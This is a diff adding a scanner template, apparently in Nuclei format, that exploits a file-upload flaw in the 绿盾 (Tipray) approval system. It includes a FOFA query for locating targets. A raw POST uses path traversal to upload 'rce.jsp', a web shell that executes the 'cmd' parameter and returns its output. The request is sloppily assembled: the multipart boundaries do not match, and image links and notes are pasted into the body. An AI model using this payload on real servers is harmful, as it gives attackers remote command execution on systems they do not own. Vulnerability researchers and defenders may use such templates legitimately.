@@ -1,0 +1,43 @@
+id: poc-ryx2tfno9i8bxkp1
+info:
+  name: 天锐绿盾审批系统 uploadWxFile.do 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ryx2tfno9i8bxkp1'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ryx2tfno9i8bxkp1
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+    Content-Disposition: form-data; name="file"; filename="rce.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121845935-c559346c-8e3a-49f5-91a2-bdd7793dece4.png)
+
+    回显必须是true，文件会上传到根目录
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121846214-96e2d3b6-7dc9-4bd4-baa5-ca4716b921cc.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
